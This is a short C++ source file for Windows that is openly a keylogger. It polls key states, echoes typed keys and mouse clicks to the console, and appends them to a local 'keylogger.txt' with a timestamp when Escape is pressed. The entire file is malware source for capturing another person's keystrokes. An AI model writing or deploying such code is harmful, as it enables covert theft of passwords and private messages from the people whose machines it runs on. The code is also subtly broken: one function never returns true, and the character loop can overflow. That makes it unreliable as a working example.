#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <stdio.h>
#include <ctime>

using namespace std;

void WriteToLog( string text ){
    ofstream logfile;
    logfile.open("keylogger.txt", fstream::app);
    logfile << text;
    logfile.close();
}

bool KeyIsListed(int iKey){
    switch (iKey){
        case VK_SPACE:
            cout << " ";
            WriteToLog(" ");
            break;
        case VK_SHIFT:
            cout << " *SHIFT* ";
            WriteToLog(" *SHIFT* ");
            break;
        case VK_RETURN:
            cout << " \n ";
            WriteToLog(" \n ");
            break;
        case VK_BACK:
            cout << " *BACKSPACE* ";
            WriteToLog(" *BACKSPACE* ");
            break;
        case VK_RBUTTON:
            cout << " *RIGHT CLICK* ";
            WriteToLog(" *RIGHT CLICK* ");
            break;
        case VK_LBUTTON:
            cout << " *LEFT CLICK* ";
            WriteToLog(" *LEFT CLICK* ");
            break;
        default:
            return false;
    }
}

int main()
{
    char key;
    int i=0;
    while (i<100){
        Sleep(10);
        for(key=32; key<=128;key++){
            if (GetAsyncKeyState(VK_ESCAPE) ==-32767){
                ofstream logfile;
                time_t t = time(0);
                tm* now = localtime(&t);
                logfile.open("keylogger.txt", fstream::app);
                logfile << "\nEND of LOG - DateTime of End: " << (now->tm_year + 1900) << '-' << (now->tm_mon + 1) << '-'<<  now->tm_mday << 
                ' '<<now->tm_hour<<':'<<now->tm_min << "\n";
                logfile.close(); 
            return 0;
            }
            if (GetAsyncKeyState(key) == -32767){  //the key is used and is not up
                if (!KeyIsListed(key)){
                        ofstream logfile;
                        logfile.open("keylogger.txt", fstream::app);
                        cout << key ;
                        logfile << key ;
                        logfile.close();
                }
            }
        }
        i+=1;

    }
    return 0;
} 